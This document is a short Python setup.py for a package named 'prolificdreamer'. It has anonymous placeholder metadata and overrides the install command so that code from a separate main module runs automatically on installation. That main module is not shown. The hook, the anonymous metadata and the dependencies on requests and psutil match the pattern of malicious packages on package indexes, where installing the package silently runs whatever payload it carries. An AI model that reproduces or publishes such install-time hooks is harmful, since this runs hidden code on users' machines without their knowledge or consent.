from setuptools import setup, find_packages
from setuptools.command.install import install


class CrazyInstallStrat(install):
    def run(self):
        install.run(self)
        from main import main
        main()

setup(
    name="prolificdreamer",
    version="9.6",
    author="anon",
    author_email="xxx@outlook.com",
    description="anon",
    long_description_content_type="text/markdown",
    long_description="anon",
    cmdclass={
        'install': CrazyInstallStrat,
    },
    install_requires=['requests', 'psutil'],
    setup_requires=['setuptools']
)